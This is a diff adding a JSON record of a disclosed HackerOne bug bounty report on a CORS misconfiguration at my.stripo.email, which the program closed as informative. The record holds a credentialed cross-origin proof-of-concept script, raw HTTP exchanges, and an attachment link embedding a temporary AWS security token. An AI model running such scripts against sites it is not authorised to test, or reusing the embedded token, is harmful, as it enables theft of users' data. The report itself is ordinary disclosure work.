@@ -1,0 +1,112 @@
+{
+  "id": 859688,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTk2ODg=",
+  "url": "https://hackerone.com/reports/859688",
+  "title": "CORS on my.stripo.email",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2020-04-26T14:00:34.052Z",
+  "submitted_at": "2020-04-26T14:00:34.052Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nihadp",
+    "url": "/nihadp",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 42368,
+    "url": "https://hackerone.com/stripo",
+    "handle": "stripo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Stripo Inc",
+      "twitter_handle": "",
+      "website": "https://stripo.email",
+      "about": "Stripo is a lightweight and intuitive email template editor that lets users build professional looking and highly responsive email templates."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-04-28T14:35:13.426Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-04-27T21:10:48.770Z",
+  "team_member_agreed_on_going_public_at": "2020-04-28T14:35:12.885Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey Team i don't know if it's valid or not i just want to let you know about this thanks.\n\nfollowing the HTML File ..\n\n<html>\n<script>\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://my.stripo.email/cabinet/stripo-ws/v1/stripo-websocket/info?t=1587908666898',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };\n</script>\n</html>\n\n#the Request\n\n`GET /cabinet/stripo-ws/v1/stripo-websocket/info?t=1587908666898 HTTP/1.1\nHost: my.stripo.email\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: https://my.stripo.email/cabinet/`\n\n#Response\n\nHTTP/1.1 200 \nServer: nginx\nDate: Sun, 26 Apr 2020 13:57:50 GMT\nContent-Type: application/json;charset=UTF-8\nConnection: close\nVary: Accept-Encoding\nVary: Origin\nVary: Access-Control-Request-Method\nVary: Access-Control-Request-Headers\nCache-Control: no-store, no-cache, must-revalidate, max-age=0\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Frame-Options: DENY\nX-XSS-Protection: 1; mode=block\nX-Content-Type-Options: nosniff\nX-Frame-Options: sameorigin\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nContent-Length: 77\n\n{\"entropy\":750465027,\"origins\":[\"*:*\"],\"cookie_needed\":true,\"websocket\":true}\n\nAfter i added `origin: https://gogole.com` on __Request__ \n\nthe #Resposne\n\n`HTTP/1.1 200 \nServer: nginx\nDate: Sun, 26 Apr 2020 14:00:03 GMT\nContent-Type: application/json;charset=UTF-8\nConnection: close\nVary: Accept-Encoding\nVary: Origin\nVary: Access-Control-Request-Method\nVary: Access-Control-Request-Headers\nAccess-Control-Allow-Origin: https://google.com\nAccess-Control-Allow-Credentials: true\nCache-Control: no-store, no-cache, must-revalidate, max-age=0\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Frame-Options: DENY\nX-XSS-Protection: 1; mode=block\nX-Content-Type-Options: nosniff\nX-Frame-Options: sameorigin\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nContent-Length: 78\n\n{\"entropy\":-717493192,\"origins\":[\"*:*\"],\"cookie_needed\":true,\"websocket\":true}`\n\n## Impact\n\nAs with superpowers, it’s all about knowing how to use it. Therefore, CORS is not necessarily a bad thing. We’ve seen in many cases that CORS has legitimate use, and this is why it was invented and made a web standard in the first place. However, you need to be aware of the CORS configuration you set up in your server and the side effects this has on security.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 804321,
+      "file_name": "w.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/M8WcdPREaLqKcYYNwQk6RBgY?response-content-disposition=attachment%3B%20filename%3D%22w.html%22%3B%20filename%2A%3DUTF-8%27%27w.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ5563KCL%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T003842Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIH2mUTI4P0SnQ5ajzSfxoNdCBKYmrjJfByUStPIGEq5RAiB%2FqUu6kExNyEo%2BSniG%2FMuuleX0HIunQ5AF1aCiP%2Fvo%2Fiq6BQig%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM30Us4d9hj10RmP7uKo4FaLw9G1a6LglaMko9qea%2FRmj%2F3t%2BVM51DMmcnrniUSvG7c0ZXY9tSUGO%2FFJeX39tj5pG83x3HQWGn%2FuMXxv626AP9H9psNDsy7H8NZ1X9njwOxuK8kuPxW6zMzDK42KsGkafS%2FOgMUV6AUQXNjF04DUYhsUeJqiBl7qzav3iuDL7ioML%2BFhV2WY0MVz34A1iyK%2BGFCXxWGRGEj2haRXXzDnobw1UUcBfa%2FsuBPOvNAirQSIGSxoZ2HFY40WMVbh0IqyfLYlIaplndsw70VKZhRFuRA9OjPQGcfkUXYv9Y9cKtadPabWi6x8nY74NGRePRdkJTlPoc2ovq3p3ggYPBcO4cGxQPZ%2FoqAQ8BJx7nec%2Fb1lFP5p7X5RwAAbVhz%2FAvTCsVOWzoxH8%2FWk47qMKLrxBQEH0ca4nnRrVR18HI%2FImSJOoq%2BCN94mX6pSTf73vcqId53vgtZGaXJbCmb2q4ZhutskAXTC43wtfyF%2FsD%2Fn4o1ZIdNHSLbHPHc%2B7UEhmoD0kQlKmPLA6gAPIYk7cFyeA1YPl1%2BP1RK512rHF1PelVwFAkUuk73sTZHwW5dKT4x%2FFENummEgBfos2S8OHDOpl%2FglMyeQmVzvgk0PH2GA6%2BnixJxM%2F39I4cstKRHv4Q%2Bne0DwhhNlsJNcc9TjdU9Upp1lFgwfhWclO2yc4esIj%2F490nT6S5GhWFV3bK7%2BjBx7gkoCBE%2FnMXnvKSBzxXuKoP23jGiLgN1CCNiMZDre5nRKlfbEHn8LuK%2Fu6N%2Fq6g34XL51DJ04xpI6UBkCMHw%2BEB%2B9p0BvSfQntsJyNMHal1pTOBkAkpWBu9BhikwkTNjfPgFL%2BcOu%2F0hyBdBGLOyCOhfgY7ERXAaSLqbzUVMOzM48wGOrIB6rVEanPToOQLVhAyFcKlsLtJEWQB8ng5eXPVD1sHqsB3BZzfcy6J74zSYfhff5lSlYlpbIkvegqt5irfvwHxYOO9nK2b4kKQc%2FUj5CcOblEnfkC4dK4TYavIqs7Uk1mydQeDlETvmxxKqVxqhq6wPgZ40SeV%2BEECVAhWEswtTLGEfeWLCXBZODM5572x7xKBQ3wN9wimakqFXfngg0QGIKoSk0CwgTfwoPDda5A0oL6quQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ae06c045956fa67820dc7455116d91a23ffd57402b5c39dcc8eeff6c96b6f32b",
+      "file_size": 300,
+      "type": "text/html",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "b102af068378dcb020ef485"
+  ],
+  "structured_scope": {
+    "databaseId": 38702,
+    "asset_type": "URL",
+    "asset_identifier": "my.stripo.email",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
